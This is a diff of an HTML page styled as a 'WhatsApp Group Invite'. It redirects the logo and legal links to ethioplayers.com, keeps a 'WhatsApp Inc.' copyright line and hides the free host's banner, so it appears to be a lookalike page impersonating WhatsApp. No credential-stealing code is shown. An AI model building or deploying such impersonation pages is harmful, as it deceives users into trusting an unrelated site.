@@ -3,25 +3,16 @@
 <style>img[alt*="www.000webhost.com"]{display:none}</style>
 <meta charset="UTF-8">
 <title>WhatsApp Group Invite</title>
-<meta property="og:title" content="WhatsApp Group Invite"/>
-<meta property="og:image" content="img/v4/icon.png"/>
-<meta property="og:site_name" content="WhatsApp.com"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
-<meta http-equiv="X-UA-Compatible" content="IE=9">
-<meta name="theme-color" content="#1BA691">
-<meta name="msapplication-navbutton-color" content="#1BA691">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="#1BA691">
+
 <link id="favicon" rel="shortcut icon" href="img/v4/icon.png" type="image/png">
 <link rel="stylesheet" href="css/v4/style.build35e635e635e6.css">
 <!--Follow the link to join-->
-<meta property="og:description" content="Follow this link to join"/>
 </head>
 <body class="page page--landing page--invite" id="top">
 <div class="header ">
 	<header class="page-header ">
 	<div class="page-header__inner">
-		<a class="page-header__logo" href="https://www.whatsapp.com/"></a>
+		<a class="page-header__logo" href="https://www.ethioplayers.com/"></a>
 		<div class="page-header__language">
 			<div id="lng" onclick="toggle_lng_menu()">
 				<span class="lng-id" dir="auto">
@@ -29,12 +20,7 @@
 				<span class="lng-name">English</span>
 				</span>
 			</div>
-			<div id="helptranslate">
-				<li>
-					<a href="https://translate.whatsapp.com/" target="_blank">Help translate WhatsApp into your language</a>
-				</li>
-				<div class="clear"></div>
-			</div>
+			
 		</div>
 	</div>
 </div>
@@ -62,7 +48,7 @@
 		<div class="page-footer__inner">
 			<div class="four -spaced">
 				<div class="block block--footer four__item">
-					<h4 class="block__title">WhatsApp</h4>
+					<h4 class="block__title">WhatsApppp</h4>
 					<div class="block__body">
 						<ul class="list list--footer">
 							<li class="list__item">
@@ -169,7 +155,7 @@
 			<div class="four">
 				<div class="four__item" dir="auto"> <?php echo date("Y"); ?>  &copy; WhatsApp Inc.</div>
 				<div class="four__item -span3">
-					<a href="https://www.whatsapp.com/legal/" class="page-footer__link">Privacy & Terms</a>
+					<a href="https://www.ethioplayers.com/legal/" class="page-footer__link">Privacy & Terms</a>
 				</div>
 			</div>
 		</div>
